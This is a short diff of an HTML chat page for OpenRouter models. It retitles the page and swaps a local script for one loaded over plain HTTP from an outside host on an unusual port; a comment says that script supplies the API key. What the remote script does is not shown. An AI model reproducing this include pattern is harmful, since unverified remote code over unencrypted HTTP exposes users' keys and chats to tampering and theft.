@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Dark Heavens: GPT</title>
+    <title>AI Чат (OpenRouter)</title>
     <style>
         /* General Styles */
         body {
@@ -383,7 +383,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/markdown-it@14.0.0/dist/markdown-it.min.js"></script>
-    <script src="./eiiei.js"></script>
+         <script src="http://f1.aurorix.net:40857/eiiei.js"></script>
 </head>
 <body>
 
@@ -427,7 +427,7 @@
 </div>
 
 <script>
-    let modelName = "deepseek/deepseek-chat-v3-0324:free";
+      let modelName = "deepseek/deepseek-chat-v3-0324:free";
     const chatListElement = document.getElementById("chat-list");
     const chatLogElement = document.getElementById("chat-log");
     const loadingIndicatorElement = document.getElementById("loading-indicator");
@@ -560,7 +560,7 @@
         loadingIndicatorElement.style.display = "block";
 
         try {
-             // API-ключ берется из глобальной области видимости (из eiiei.js)
+         // API-ключ берется из глобальной области видимости (из eiiei.js)
             const response = await fetch("https://openrouter.ai/api/v1/chat/completions", {
                 method: "POST",
                 headers: {
